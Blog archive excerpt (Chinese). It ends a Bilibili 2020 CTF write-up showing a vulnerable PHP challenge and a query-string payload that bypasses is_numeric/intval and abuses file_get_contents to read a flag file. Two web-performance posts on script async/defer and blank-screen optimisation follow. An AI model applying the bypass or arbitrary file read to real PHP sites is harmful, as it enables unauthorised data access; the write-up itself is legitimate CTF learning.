src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\"> <div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-25</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no “document.write” in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\"> <div class=\"license-title\">从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-13</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/1.png\" width=\"1276\" height=\"279\" class=\"lazy post-img\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/2.png\" width=\"1386\" height=\"946\" class=\"lazy post-img\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/3.png\" width=\"860\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/4.png\" width=\"1194\" height=\"946\" class=\"lazy post-img\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/5.png\" width=\"960\" height=\"500\" class=\"lazy post-img\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 